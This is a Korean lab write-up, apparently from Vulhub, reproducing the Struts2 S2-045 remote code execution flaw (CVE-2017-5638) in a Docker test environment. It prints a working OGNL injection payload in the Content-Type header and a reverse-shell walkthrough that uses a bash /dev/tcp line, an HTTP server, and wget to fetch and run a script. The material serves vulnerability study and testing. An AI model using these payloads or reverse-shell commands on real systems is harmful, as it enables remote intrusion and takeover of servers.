# Struts2 S2-045 원격 코드 실행 취약점 CVE-2017-5638

## 취약점 설명 

Jakarta Multipart 파서 기반의 파일 업로드 모듈은 파일 업로드(멀티파트) 요청 처리 시 예외 정보를 캡처하고 예외 정보에 대한 OGNL 표현식 처리를 수행합니다. 그러나 content-type이 잘못된 것으로 판단되면 예외가 발생하고 Content-Type 속성 값이 포함되므로 OGNL 표현식을 사용하여 URL을 구성하면 원격 코드 실행이 가능 하다.

## 영향 받는 버전 

Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

## 환경설

Vulhub 다음 명령을 실행하여 s2-045 테스트 환경을 시작

```
docker-compose build
docker-compose up -d
```

환경이 시작된 후`http://your-ip:8080`방문하시면 업로드 페이지를 보실 수 있습니다.

## 취약점 재발

다음 데이터 패킷을 직접 보내면`233*233`성공적으로 실행되었음을 알 수 있습니다.

```
POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Length: 0
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('vulhub',233*233)}.multipart/form-data
```


### 리바운드 쉘

쉘 스크립트를 작성하고 http 서버를 시작

```
echo "bash -i >& /dev/tcp/192.168.174.128/9999 0>&1" > shell.sh
python3环境下：python -m http.server 80
```

shell.sh 파일을 업로드하는 명령은 다음과 같습니다.

```
wget 192.168.174.128/shell.sh
```

취약점EXP를 통해 위 명령을 실행

shell.sh 파일을 실행하는 명령

```
bash shell.sh
```

취약점 EXP를 통해 위 명령을 실행

리바운드 쉘 성공적으로 받음

참고문헌:

- http://struts.apache.org/docs/s2-045.html
- https://blog.csdn.net/u011721501/article/details/60768657
- https://paper.seebug.org/247/
